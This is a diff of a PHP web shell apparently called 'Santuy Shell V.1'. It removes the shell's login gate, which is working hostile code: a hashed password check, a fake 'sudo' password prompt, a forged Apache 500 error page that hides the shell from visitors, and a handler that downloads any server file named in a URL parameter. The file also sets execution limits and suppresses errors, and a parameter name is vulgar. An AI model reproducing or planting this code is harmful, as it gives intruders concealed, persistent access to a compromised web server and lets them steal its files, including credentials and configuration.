@@ -10,58 +10,6 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 date_default_timezone_set("Asia/Jakarta");
-$auth_pass = "0a8e2a4233deac4814def868b44d5f25";
-
-function login() { 
-$a_log ="<html><head><title>Santuy Shell V.1</title></head>";
-$a_log.="<font color=green>TatsumiCrew@".$_SERVER['HTTP_HOST']." :~$ sudo su</font>";
-$a_log.="<form method='POST'><label for='pass'><font color=green>[ sudo ] password for TatsumiCrew: </label><input type='password' name='pass' style='border:0;color:white;width:0px;'></form>";
-$a_log.="</body></html>";   
-if(empty($_GET['memek'])=="enak"){
-    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-<html>
-<head>
-<title>500 Internal Server Error</title>
-</head>
-<body>
-<h1>Internal Server Error  </h1>
-<p>The server encountered an internal error or
-misconfiguration and was unable to complete
-your request.</p>
-<p>Please contact the server administrator at 
- webmaster@'.$_SERVER['HTTP_HOST'].' to inform them of the time this error occurred,
- and the actions you performed just before this error.</p>
-<p>More information about this error may be available
-in the server error log.</p>
-<p>Additionally, a 500 Internal Server Error
-error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>
-<address>'.$_SERVER['SERVER_SOFTWARE'].' Server at '.$_SERVER['HTTP_HOST'].' Port 80</address></body></html>
-';
-}else{
-    echo $a_log;
-}
-exit;
-}
-if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
-    if( empty( $auth_pass) || 
-        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass) ) ) 
-        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
-    else 
-       login();
-   if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
-    @ob_clean();
-    $file = $_GET['file'];
-    header('Content-Description: File Transfer');
-    header('Content-Type: application/octet-stream');
-    header('Content-Disposition: attachment; filename="'.basename($file).'"');
-    header('Expires: 0');
-    header('Cache-Control: must-revalidate');
-    header('Pragma: public');
-    header('Content-Length: ' . filesize($file));
-    readfile($file);
-    exit;
-}
-?>
 <?php
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
